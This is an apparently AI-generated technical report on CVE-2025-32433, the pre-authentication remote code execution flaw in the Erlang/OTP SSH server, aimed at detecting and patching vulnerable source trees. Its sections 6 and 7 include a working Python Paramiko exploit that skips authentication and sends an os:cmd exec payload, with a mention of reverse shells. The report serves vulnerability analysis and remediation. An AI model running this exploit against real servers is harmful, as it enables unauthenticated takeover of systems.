# Comprehensive Technical Analysis of CVE-2025-32433: Pre-Authentication Remote Code Execution in Erlang/OTP SSH Server

**Key Points:**
*   **Vulnerability:** CVE-2025-32433 is a critical (CVSS 10.0) pre-authentication Remote Code Execution (RCE) flaw in the Erlang/OTP SSH server [cite: 1, 2]. 
*   **Root Cause:** The server fails to validate the authentication state of the connection before processing SSH connection protocol messages (message IDs $\ge$ 80), such as `SSH_MSG_CHANNEL_OPEN` and `SSH_MSG_CHANNEL_REQUEST` [cite: 3].
*   **Impact:** Attackers can open session channels and execute arbitrary Erlang or system commands without providing valid credentials [cite: 4, 5].
*   **Affected Versions:** All Erlang/OTP versions prior to the patched releases: OTP 27.3.3, OTP 26.2.5.11, and OTP 25.3.2.20 [cite: 6, 7].
*   **Fix:** The official patch introduces a pattern-matching clause in `ssh_connection.erl` that explicitly intercepts messages for unauthenticated connections and drops them with a protocol disconnect error [cite: 3, 8].

**Abstract Overview**
Research suggests that CVE-2025-32433 represents one of the most critical security flaws recently discovered in telecommunications and operational technology (OT) infrastructure due to Erlang/OTP's widespread use in high-availability systems. It seems likely that the flaw stems from a fundamental violation of RFC 4252, which mandates that SSH connection protocol messages must be rejected if received before the authentication phase is complete. This report synthesizes available technical data, source code diffs, state machine architectures, and exploit methodologies to provide a highly detailed reference for identifying and patching this vulnerability programmatically. 

---

## 1. Exact CVE Details and Root Cause

### 1.1 CVE Identification and Metrics
**CVE-2025-32433** is a critical security vulnerability classified as a pre-authentication Remote Code Execution (RCE) flaw within the Secure Shell (SSH) server implementation of Erlang/OTP (Open Telecom Platform) [cite: 2, 6]. The vulnerability was discovered by researchers Fabian Bäumer, Marcel Maehren, Marcus Brinkmann, Nurullah Erinola, and Jörg Schwenk from Ruhr University Bochum [cite: 9, 10].

The vulnerability is tracked with the highest possible severity rating:
*   **CVSS v3.1 Base Score:** 10.0 (Critical) [cite: 2, 7]
*   **Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` [cite: 11, 12]
*   **CWE Identifier:** CWE-306 (Missing Authentication for Critical Function) [cite: 7, 12]

| Metric | Value | Description |
| :--- | :--- | :--- |
| **Attack Vector (AV)** | Network (N) | The vulnerability is exploitable remotely over the network [cite: 10]. |
| **Attack Complexity (AC)** | Low (L) | Exploitation requires no advanced conditions and is highly reproducible [cite: 10]. |
| **Privileges Required (PR)** | None (N) | No prior authentication or authorization is needed [cite: 10]. |
| **User Interaction (UI)** | None (N) | The attack is completely automated and zero-click [cite: 10]. |

### 1.2 The Root Cause Mechanism
The root cause of CVE-2025-32433 lies in a state machine implementation flaw regarding how the Erlang/OTP SSH server handles out-of-order SSH protocol messages.

The SSH protocol is divided into three main layers:
1.  **Transport Layer Protocol (RFC 4253):** Handles key exchange (KEX) and encryption.
2.  **User Authentication Protocol (RFC 4252):** Handles user credential verification.
3.  **Connection Protocol (RFC 4254):** Handles multiplexing encrypted tunnels into logical channels for execution, shells, and subsystems.

According to **RFC 4252 Section 6**, SSH message IDs that are 80 and higher are strictly reserved for the Connection Protocol (post-authentication). The RFC mandates that receiving any of these messages *before* the authentication phase is fully complete is a protocol error, and the server MUST respond by disconnecting the client [cite: 3, 13].

In vulnerable versions of Erlang/OTP, the SSH server's message dispatch logic failed to enforce this prerequisite [cite: 4, 13]. As a result, an attacker could successfully complete the Transport Layer Key Exchange and immediately send connection protocol messages. The server would process these messages, allowing the attacker to send `SSH_MSG_CHANNEL_OPEN` (Message ID 90) to create a session channel, followed by an `SSH_MSG_CHANNEL_REQUEST` (Message ID 98) with the type set to "exec" or "shell" [cite: 3, 5]. This bypasses the User Authentication protocol entirely, culminating in unauthenticated command execution within the context of the Erlang node [cite: 4].

---

## 2. Affected Erlang/OTP Source Files and Functions

The Erlang/OTP SSH application is located within the `lib/ssh/` directory of the OTP source tree. The vulnerability primarily resides in the module responsible for handling SSH connection protocol multiplexing and message parsing.

### 2.1 Key Vulnerable Files
The primary files involved in the vulnerability and its remediation are:
*   `lib/ssh/src/ssh_connection.erl`: This file contains the logic for processing channel multiplexing messages (IDs 80-127). The vulnerability is specifically located in how this module's `handle_msg/4` function receives messages dispatched from the main state machine [cite: 3, 14].
*   `lib/ssh/src/ssh_connection_handler.erl`: The `gen_statem` behavior module that acts as the primary state machine for the SSH connection. It is responsible for routing incoming decrypted SSH packets to the appropriate sub-modules [cite: 15, 16].
*   `lib/ssh/test/ssh_protocol_SUITE.erl`: The testing suite file where new unit tests were added to validate the fix and prevent regressions [cite: 3, 14].

### 2.2 The Vulnerable Function Clauses
In vulnerable versions, `lib/ssh/src/ssh_connection.erl` contains multiple function clauses for `handle_msg/4`. These clauses are pattern-matched based on the incoming SSH record (e.g., `#ssh_msg_channel_open{}`, `#ssh_msg_channel_request{}`) [cite: 17, 18].

Prior to the patch, if a message like `#ssh_msg_channel_open{}` arrived, the function clauses simply matched the record type and processed the channel creation logic, implicitly trusting that the parent state machine (`ssh_connection_handler`) would only dispatch these messages if the connection was already in the `{connected, server}` state. However, because the state machine passed unhandled or globally accepted message types to `ssh_connection:handle_msg/4`, the connection module processed them regardless of the `#ssh{authenticated = false}` state [cite: 3, 19].

---

## 3. The Official Patch/Fix

The official remediation applied by the Erlang/OTP maintainers in versions **27.3.3**, **26.2.5.11**, and **25.3.2.20** involved adding an explicit authorization check at the very top of the message handling logic for connection protocol messages [cite: 6, 9].

### 3.1 The Code Diff
The fix introduces a catch-all pattern matching clause in `lib/ssh/src/ssh_connection.erl` that triggers when the internal `#ssh{}` record indicates `authenticated = false`.

Based on the official git commit (`0fcd9c56524b28615e8ece65fc0c3f66ef6e4c12` / `6eef04130afc8b0ccb63c9a0d8650209cf54892f`), the added Erlang code is as follows:

```erlang
%%% lib/ssh/src/ssh_connection.erl

handle_msg(#ssh_msg_disconnect{code = Code, description = Description}, Connection, _, _SSH) -> 
    {disconnect, {Code, Description}, handle_stop(Connection)}; 

%% [NEW CODE ADDED IN PATCH]
handle_msg(Msg, Connection, server, Ssh = #ssh{authenticated = false}) ->
    %% See RFC4252 6.
    %% Message numbers of 80 and higher are reserved for protocols running
    %% after this authentication protocol, so receiving one of them before
    %% authentication is complete is an error, to which the server MUST
    %% respond by disconnecting, preferably with a proper disconnect message
    %% sent to ease troubleshooting.
    {disconnect, {?SSH_DISCONNECT_PROTOCOL_ERROR, "Unauthenticated connection protocol message"}, Connection};
%% [END OF NEW CODE]

handle_msg(#ssh_msg_channel_open{...}, Connection, Role, SSH) ->
    ...
```
*(Reference: GreyNoise Labs Vulnerability Analysis and official OTP commits [cite: 3, 8])*

### 3.2 Mechanism of the Fix
Erlang relies heavily on pattern matching. When the SSH server receives a decrypted packet, it converts it into an Erlang record and calls `handle_msg/4`. 
1. The new clause explicitly matches `Ssh = #ssh{authenticated = false}` and the `server` role.
2. Because Erlang evaluates function clauses sequentially from top to bottom, any connection protocol message (which `ssh_connection.erl` handles) received while `authenticated = false` will immediately match this new clause.
3. The clause returns a tuple: `{disconnect, {?SSH_DISCONNECT_PROTOCOL_ERROR, ...}, Connection}`.
4. The parent `ssh_connection_handler` receives this tuple and safely tears down the TCP socket, neutralizing the attack before any channel allocation or command execution logic can be evaluated [cite: 3, 19].

---

## 4. SSH Protocol Message Handling in Erlang/OTP

Understanding how to dynamically analyze and patch this module requires a deep dive into the Erlang/OTP SSH server's state machine architecture.

### 4.1 The `gen_statem` Architecture
Historically, Erlang's SSH server utilized the `gen_fsm` behavior. In OTP 19, this was heavily refactored to use the modern `gen_statem` (State Machine) behavior [cite: 15, 20]. The module driving this is `lib/ssh/src/ssh_connection_handler.erl`.

`gen_statem` uses explicit state names. In the context of the SSH server, the primary states include:
*   `hello`: The initial TCP connection and banner exchange.
*   `kexinit` / `key_exchange`: Negotiation of cryptographic algorithms and Diffie-Hellman key exchange.
*   `{userauth, Role}` (e.g., `{userauth, server}`): The phase where the server expects `SSH_MSG_USERAUTH_REQUEST` messages (passwords, public keys).
*   `{connected, Role}` (e.g., `{connected, server}`): The post-authentication phase where multiplexed channels operate [cite: 15, 16, 21].

### 4.2 Message Dispatching Vulnerability
During the `{userauth, server}` state, the `ssh_connection_handler:handle_event/4` function receives decrypted messages. Ideally, it should strictly only process `SSH_MSG_USERAUTH_*` messages and global connection management messages (like `SSH_MSG_IGNORE`, `SSH_MSG_DISCONNECT`, `SSH_MSG_DEBUG`).

However, architectural decoupling meant that general connection handling logic was offloaded to `ssh_connection:handle_msg/4`. If a client sent an `SSH_MSG_CHANNEL_OPEN` (Message ID 90) during the `{userauth, server}` state, the `ssh_connection_handler` did not explicitly reject it. Instead, it delegated the message to `ssh_connection.erl`. Because `ssh_connection.erl` lacked an explicit check for the `#ssh.authenticated` boolean flag in unpatched versions, the state machine successfully opened the channel [cite: 3, 13, 19].

---

## 5. Version-Specific Details for OTP 27.3.2

### 5.1 Vulnerability Confirmation
The user query explicitly asks to confirm the status of **OTP 27.3.2**.
Based on the official advisories, the vulnerability affects all Erlang/OTP versions below OTP-27.3.3 [cite: 1, 6, 7]. Therefore, **OTP 27.3.2 is definitively vulnerable** to CVE-2025-32433.

### 5.2 Source Code State in 27.3.2
In OTP 27.3.2, the `lib/ssh/src/ssh_connection.erl` file lacks the `authenticated = false` pattern matching clause. If a Python utility module is written to patch this specific version, it must scan `ssh_connection.erl` for the `handle_msg(#ssh_msg_disconnect{...})` clause and inject the RFC 4252 validation clause immediately below it, ensuring that messages routed to `ssh_connection` are gated by authentication state [cite: 3, 8].

---

## 6. The Specific Attack Vector

Exploiting this vulnerability does not require complex memory corruption or buffer overflows; it is purely a logical protocol sequence exploitation [cite: 5, 19]. 

### 6.1 The Exploitation Sequence
To trigger the vulnerability, an attacker performs the following sequence:

1.  **TCP Handshake & Protocol Banner:** The attacker connects to the Erlang SSH port (typically TCP 22 or a custom port like 2222) and exchanges the standard SSH protocol identification strings (e.g., `SSH-2.0-ExploitClient`) [cite: 3, 5].
2.  **Key Exchange (KEX):** The attacker completes a standard, valid Key Exchange. This includes sending `SSH_MSG_KEXINIT` and deriving a shared session key using Diffie-Hellman or Elliptic Curve algorithms. At this point, the transport layer is secure and encrypted [cite: 5].
3.  **Pre-Auth Injection (`SSH_MSG_CHANNEL_OPEN`):** Instead of sending `SSH_MSG_USERAUTH_REQUEST` to authenticate, the attacker immediately sends a connection protocol message. The attacker transmits `SSH_MSG_CHANNEL_OPEN` (Message ID 90), specifying the channel type as `"session"`.
    *   *Result:* The vulnerable server erroneously allocates a session channel and replies with `SSH_MSG_CHANNEL_OPEN_CONFIRMATION` [cite: 4].
4.  **Remote Code Execution (`SSH_MSG_CHANNEL_REQUEST`):** The attacker sends an `SSH_MSG_CHANNEL_REQUEST` (Message ID 98) over the newly opened channel. They set the request type to `"exec"` and provide an arbitrary payload [cite: 3, 5].
    *   *Erlang OS Command Payload:* In Erlang, system commands are often executed using the `os:cmd/1` function. The attacker can pass `"os:cmd('id > /tmp/pwned')."` or a reverse shell payload [cite: 3, 22].
5.  **Execution:** The Erlang node parses the exec request and executes it with the privileges of the Erlang SSH daemon process (often `root` in embedded/OT environments) [cite: 13, 23].

---

## 7. Python Paramiko Exploitation Details

To build a utility module that verifies whether an Erlang source tree is currently vulnerable (e.g., by compiling it and running a dynamic test via Docker), one can use the Python `paramiko` library.

Standard SSH clients (like `/usr/bin/ssh` or high-level `paramiko.SSHClient`) strictly adhere to the RFCs and refuse to send channel requests before authentication succeeds. To execute the exploit, the script must leverage Paramiko's lower-level `Transport` class to manually construct and transmit raw SSH message objects [cite: 3].

### 7.1 Paramiko Exploit Proof-of-Concept
The following demonstrates how a validation script bypasses the authentication phase using `paramiko`:

```python
#!/usr/bin/env python3
import socket
import paramiko
import time
from paramiko.message import Message
from paramiko.common import cMSG_CHANNEL_OPEN, cMSG_CHANNEL_REQUEST

def verify_vulnerability(host, port):
    try:
        # 1. Establish underlying TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # 2. Start the Paramiko Transport layer (handles KEX automatically)
        transport = paramiko.Transport(sock)
        transport.start_client()
        
        # Wait briefly for Key Exchange to finalize
        print("[*] SSH Handshake and KEX complete.")
        
        # 3. Craft and send SSH_MSG_CHANNEL_OPEN (Message ID 90) pre-authentication
        m_open = Message()
        m_open.add_byte(cMSG_CHANNEL_OPEN)
        m_open.add_string("session") # Channel type
        m_open.add_int(0)            # Sender channel ID
        m_open.add_int(425984)       # Initial window size
        m_open.add_int(65536)        # Maximum packet size
        
        print("[*] Sending pre-auth cMSG_CHANNEL_OPEN...")
        transport._send_message(m_open)
        time.sleep(0.5) # Allow server to process and allocate channel
        
        # 4. Craft and send SSH_MSG_CHANNEL_REQUEST (Message ID 98) for RCE
        m_req = Message()
        m_req.add_byte(cMSG_CHANNEL_REQUEST)
        m_req.add_int(0)             # Recipient channel ID
        m_req.add_string("exec")     # Request type
        m_req.add_boolean(False)     # Want reply = False
        
        # Erlang OS command injection payload
        payload = "os:cmd('touch /tmp/cve_2025_32433_vulnerable')."
        m_req.add_string(payload)
        
        print("[*] Sending cMSG_CHANNEL_REQUEST with 'exec' payload...")
        transport._send_message(m_req)
        time.sleep(1)
        
        print("[+] Exploit payload delivered successfully.")
        transport.close()
        
    except Exception as e:
        print(f"[-] Error during exploitation sequence: {e}")

if __name__ == "__main__":
    verify_vulnerability("127.0.0.1", 10022)
```
*(Based on the GreyNoise Labs AI-free PoC analysis [cite: 3])*

By intercepting the `Transport` object and calling `_send_message(m)` directly, the script bypasses `paramiko`'s internal state checks that would normally require `transport.auth_password()` or `transport.auth_publickey()` to succeed first.

---

## 8. File Paths within OTP Source Tree

When building a utility to automatically identify and patch Erlang source code, it is critical to know the precise directory structure. In Erlang/OTP, applications are modular. The SSH server application is self-contained.

### 8.1 Exact Directory Structure
For **OTP 27.3.2**, the root repository contains a `lib/` directory housing all applications. The relevant directory is `lib/ssh/`. 

The source code (`.erl` files) is located in `lib/ssh/src/` [cite: 24, 25, 26].

```text
otp/
└── lib/
    └── ssh/
        ├── src/
        │   ├── ssh.erl                   # High-level SSH application API
        │   ├── ssh_cli.erl               # Handles interactive shell/CLI logic
        │   ├── ssh_connection.erl        # **VULNERABLE FILE** - Handles channels/exec
        │   ├── ssh_connection_handler.erl# The gen_statem state machine
        │   ├── ssh_fsm_kexinit.erl       # Key exchange initialization
        │   ├── ssh_sftp.erl              # SFTP subsystem logic
        │   ├── ssh_transport.erl         # Transport layer/encryption
        │   └── ...
        └── test/
            ├── ssh_protocol_SUITE.erl    # Test suite where CVE patch tests reside
            └── ...
```
*(Reference: GitHub OTP Source Tree mappings [cite: 16, 24, 25, 27])*

### 8.2 Utility Patching Logic
A Python patching utility would need to:
1. Locate `lib/ssh/src/ssh_connection.erl` in the target source tree.
2. Search for the string `handle_msg(#ssh_msg_disconnect` to find the correct insertion point.
3. Check if `handle_msg(Msg, Connection, server, Ssh = #ssh{authenticated = false})` already exists. If it does, the source is already patched.
4. If missing, insert the patch code directly below the `ssh_msg_disconnect` clause.
5. Recompile the Erlang SSH application using `erlc` or the OTP build system (`make`).

---

## 9. Conclusion and Threat Landscape

CVE-2025-32433 represents a catastrophic failure in protocol state enforcement. Because Erlang/OTP is heavily utilized in high-availability, distributed environments—such as 5G telecommunications, industrial operational technology (OT) firewalls, and Internet of Things (IoT) backbones—the attack surface is immense [cite: 4, 28]. 

Threat actors, including ransomware groups, have actively exploited this vulnerability in the wild, particularly targeting exposed OT networks in healthcare, agriculture, and high technology sectors [cite: 28, 29]. The ability to achieve `root`-level system compromise prior to authentication allows attackers to bypass all traditional credential-based access controls and multi-factor authentication (MFA) protections [cite: 5, 19].

Organizations maintaining proprietary forks or custom builds of Erlang/OTP 27.3.2 (or older) must prioritize the integration of the explicit `authenticated = false` pattern-matching disconnect logic within `ssh_connection.erl` to secure their infrastructure against unauthenticated remote code execution.

**Sources:**
1. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQGpFe8F8rRduhshR5kjW-NPsPV4J5ffQmHoYyW4XbumIuoAvOtwbwtKojFjZGrnY_v-yVrcfQvztFxOfJouJCxAK4qGw1MpvcgGwL6gWrO6hpk4a0PWO3DYvPJnPbRlOWXJwYA=)
2. [offsec.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHm3J8iQDBAm3Bgc0PfjdscEQrdCaCjYU2DyVIjIXZRzOU_kxDI8zEGxiIMipwAKu5RUNXtaElF6W62BDO1ASD4AooqqC8Q0-aIpgV03ZqNQ7Qa9YkVJTBZJr4yuQQTgt3D)
3. [greynoise.io](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEKOd44ZOevlIEQoYEehVayog9XZdiVoYHyQdF1nD2yjsQ0ozztktul5e_hDFPwvcA-EmF8ucosGwRDHnFG4krAGguGy-aO8Nu4NiZsH3tzLZuMICJolsh-i-fpFj3cfFbGiq5ihgXB0BiMkmEG95EHWui_)
4. [keysight.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQF9bb71VNA0mTk-lSNfdAlYLo3-KxQO-2nNQXeysbgNLJO5KgYR0xTZZxchzzYPTIUNb2-w1byiHnBr8xvtMtTrchl1xEDuSkk4Cpd8o6sgrzyBje19RbR2-wmDefJATksaVRQLbTRgTOzf82PiUBFvdx4TxpOYaDweNdJOob4A9EIxTkHswmeJ1Oc_WWGsnzFXPmtTAQ==)
5. [sonicwall.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFbIMp0KixkYVQAKSnyCJQ7MnqRn27tZ_NU6QfTupJmXjrDf180nLGeGv83VLyqDMmuApYcoJ4sddVUQFcqi345cCOM2U1ERr7McxEu3LkcQwZvvO-zUwRHkneJxUl8EcZalsmyCVNvJINkQS5vJqVI-v-2HCs4nILxG7_bFCiiwbOGrwT65BAX6J9yJPoy2L-v5QIqW4Z9)
6. [nist.gov](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFtV8LhsrQw55ppn-OirQCaivzZfWcXWR-6sDcxivw5Ue0qJykuUlrLBnJR0eTcROFhNBn9qWCLIP5JWOFf_CJhU6ruJKeLWMla9WOprfPZG7Hdg91pcpetd9BgK0-DcvqWDdlP7g==)
7. [cve.org](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQF00xgd6HAF0_3z1tVTtSGT7WPzfUWxSErkBjGzGpKxPW8nU5Zn4MxDOh-za9Iqn4Q0RhH9ArkPbJltEULTQmiaZDcz97O2wDdLOIg9YRFKPsHG2kKyq-OrE0MHi8qr8T7MRqD4zQ==)
8. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEBmhG34EREEOaQ5e1BWV09IrkT7WWeWbvXNq3i_sfHjf7gHQpKLTY7BI1S27LuR3VEnFr8HEKFlFXC6-4qh0fWkTvLwqEATRYupMa54a7BsjDnWncUwfC6mKhUiyCDMLUi8S_FY9oog0ZjT8dnEUxzoJftlh5trnmR-aiKhrU=)
9. [erlang.org](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFSmIkU4XRR-YDCV_Nw-PWuIS42o1zTpcNzG8gl0znZGVSaNZHXSy1ltExxD-Od9pJC0L9hxRjYdUQXWOnUKEecrL95Bm2SKevy92n331AEE2eCJsBxQD4JudtkVL3FlPVVGS6p)
10. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFxkvH67ib31XSXvubOgzpdWv1yWNgsIrNuL_T9FAilyCIDSaxX0CHmaP293WDxwlX-UaIPiVYjf_pnvDj4qGCQxaMHWXtyL10C7eS6ludRjEsIMM_3qzshN_der-ybaw_qPe-N06y_QWTYAH4jQt50XT0shnXhFH_digU=)
11. [opencve.io](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQG4SFdCCRBbeEB22-mXOTZJr6O13r1Y5tQ5H1RnkZGucS8wavV-T_ZhLPCl3G_Z-MoPbGWvBOi6X5kjTShuhxqE910Lc3v730-Mi2cyF0mToJlfQYBuxBsOnqyqQ2vUQQ==)
12. [circl.lu](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQGaGWWVIotJeEXe55igzMUu0aDcf24r1P6vUYK8kZD1SBSD0Ebn3AXjUV1U87kbY33Aragib4houD8Qg5YLiRuUUpTMCxmHJkAGH5xoYo9F25ksqS0gwsNORu4Qj_8=)
13. [upwind.io](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFbaJzgpIPyhKRriRCp-Vi6eLOdGwAoAjGsNYI5Z0hRipEtFY2WLLOdN3Y5SPkMGQtSniHzlOCp8JxjAPY7wFRIpQGU9GPP6k5q7jpo555MHa3BCS9_CISQ6hfnQUvEFE8bbxaAah_GvyrD0U76HuR-55pOupcjMJzsjSDcPvWCthTuucE_kaS96ubsHIM=)
14. [ubuntuupdates.org](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQH_GQHCEs-W_M_9tgSpMrSW4ZcdWKJNGoVhm8iMUUlCI3eN1ZMn65ayqYLZqbkY2buy-A9xTlM1V8v4ZrkO28EsSwxLfn2PizEG1Jsu4dbYK0Z0XXehYYW0_KUPQG_RqU7o3MzdEsesSaDojLMaNzTjjlUqxYge-UCPVy7C0Ck0q0wb)
15. [erlang.org](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHEU4smqzjZSMRjoMBjZ0eYBeixtVhPlHmslCvZ9_C5foZlf5X1nEnHua6VwOu0xQykF13z3NsbmluE10IVf--1L3qvRIIaGzweZcfgQ5Wrf55GP9kSyonF2EtjMlrea3bT9kOebfbyC9tx-vKPPn7G6QSGlLY_RtOUefhpbIw=)
16. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHiBkX_EJ5tOxBtFP5bn7sIBO5jahIXA4nKV8dajt3W4CUoFi3L03It8p1_uJ2j0SyWBvHqAi80nv23baXYYoFX1KQM9VcuZgc5XxgAirsMjh8P5b8tTDt1HLZv0I6v8AHG6HORstuZG_a_BjuSBmXNBolgFbjvbHfCrdPkAc2hwGkcc3Czsg==)
17. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQGVbmsNKRWbT4rx7YqyeyM4fgyCOdOUUk0ZKAmvbeO_XVydDnjenZAPUJ9mFbdQawW3enGZzE_76khyutuMC5M9t2GxrQkFxqke_aqB-EUHZXg2ltjqOY0vxSWlXsOrQg==)
18. [erlang.org](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEgHTFWwPYJuzBZf02cgJPh0JlSqLsms4t6Asucb2c-_U3jDllC3K2FCLQRIfT04B70PEWGaRe228FNoo2Iv94yw55m_pZtHnZmQRYdSO5F4r7-HwSr-PBfyDE72Df1jUesXr7jnc_rX53HZ2oz0PqxRl10)
19. [cybereason.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQF-FbdikVRoLdnfFldNi6Y9y3Ufh9pFModWTbyXWK5LPAHoWNnCCiZPccoKsWU5O4xBxtg_44oYNSYFbj4VKN84QahNlQbqvGmfjOj6h7dHpeEuqoXvGt7Fy674lwjU3gWKhT12a7rLne_hJmEpYMiJHrg=)
20. [erlang.org](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQF0qYKWVAemzWW_LWMo6yWS-VOKer-0b9B-T--404AEk_UhbCvd0-hcXchB222YIjSQJrlgS0jNZZK5ifPgdZuKqd14vfmYjV3nXBZAuCZ92Bk3tN-NnsCpmN18fdaYaKHyLvWqrw==)
21. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHmhnYFC6Zr67jjljF2h3WL7o0TeSAWZIdfhNVDm8zihkQ2wAAwK8J370B_CYOn2hWqvzQ6h7pKoGOzhjt_1TmXkQ2MepceocmZMVy_QvAUiA3HpYFDI0f61FVqdco6-g==)
22. [jaacostan.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEkiZEyo8W0mPNdRgo161Ky3Bo-1uJge7CDze5q8FbpWZ3Pz7c9AQcpw8yNJQZoIxsQFVYIHZexXLkGKMcRTx2VyXwuOtx-I0FG3jWv0fIIhP3xPJMB9F98HXfUyD5SDqRRzWqaAIDQLVEVv2Iz6hL7ckD9RnRrugnwcrM1822PclqR)
23. [arcticwolf.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFnuatrK3f5Y2hqz4DftZd44tKOPV8ZMcDhtLOfuKkSySRv-xZ_dcsv-Pvdj0pFklAnRSGj_j-k0KqJQnUByGTx4kwaYpc9tJw5Yb1tzxzOQmwbh9Jqgl25EEL3EIqprZRh8v3l0jWjRnnQ5g==)
24. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHVkR_8R2DkOX0lAe_5VIbVcDj5gAQxPn577OGd2p0aTJTxfBNgP2BC-n-WEafHb-UyMDMaw2Hey4LHdvcBa253sEak_sDJuncMS_1pXzyYQ-87SHxF-yaDlere_1wTd7udI_gTdLCuhRJe0beGz5z99bzAI_onsg==)
25. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFWHyFIfsEiQcsKhDrQODi8yhK3thUQEr6NNM4b1OmcqLnqq7cSObnSi5q7lA5P-97_k2gOlfISP7tU2U98ZMdLYKjmObWGo5aZB_fzSS4o0nkugitcd-UFXPpqNr9jgpX2q9p0ithlSZP4KW-Cdjiq3Xr-UqCxWRs=)
26. [stackoverflow.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFVoOD3biYnugPNaXzoT8Nj7QZzpZXIPWwxQKZEhe_ryG5rLAqnpkEbNEk27Ab9xefkT_CqGZpdShT4l4ru6qi0V_pjwaqufKfuQlPWTBuPvHxgLLHiCaKx01x0HqKthuoX4v2TTX5a2d8Aqc0dygLjnqLGZcXLZIwMPg==)
27. [github.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHlh77q6xfNV1ELOpz9O7K9aUasVkcZ4XX7RWVP3KlY-t48dFXwUD2Nx19mn-ieRW8lrNfojtli7O_W_fjZyY1YEmy11cdEt1JMSLi57QAED9NtGNUE_9LcEd9Xy7OOroUtC556t0AiVEfJ0w6MmMxTWdMI)
28. [paloaltonetworks.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEjhAK1v-EvpKmkifoE5u1Qzt_eoY_gi2ov_th4g1suhY0R6pPfw1Si7b3-0qzNzudYCkVMrcgyI7NNIUrpbwbjcr0KcPnArfWqj9D9YbGet6hBy-mQ6SqegW6SWxv6c5j6XKWZS3vbbne3qGGxFIyZ8N2eGZVpHSdf-Lg=)
29. [fortinet.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQH6cU-RJam4W-yyioTN7yYOVKFrEce_rfeG4YfQZPWauK7Gc5-34M1LXJEvhuImQ5XhXJmExtnJLJP9EU38VUU6biUmqiKUGPoYTL9RXUQ_77K5K05r6asA6-5H8UBFVWGOtT2Bx2mN-e7Bps3X57kKw1aMyb5L3dd_kimWsMmmwP84ZVKJgUQklWLh_rh-h9MRkemx)
